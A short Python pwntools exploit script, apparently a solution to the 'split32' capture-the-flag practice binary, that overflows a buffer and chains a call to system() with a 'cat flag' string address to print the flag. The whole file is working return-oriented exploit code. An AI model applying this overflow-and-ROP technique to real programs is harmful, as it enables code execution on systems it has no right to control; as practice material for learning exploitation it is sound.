from pwn import *

system_call = 0x8048430
cat_flag = 0x0804a030
main = 0x0804857b

p = process('./split32')

exploit = ''
exploit += 'A'*44
exploit += p32(system_call)
exploit += p32(main) #Couldn't find an exit function. Don't like segfaults :(
exploit += p32(cat_flag)

p.recvuntil('>')
p.sendline(exploit)
print p.recvuntil('}')
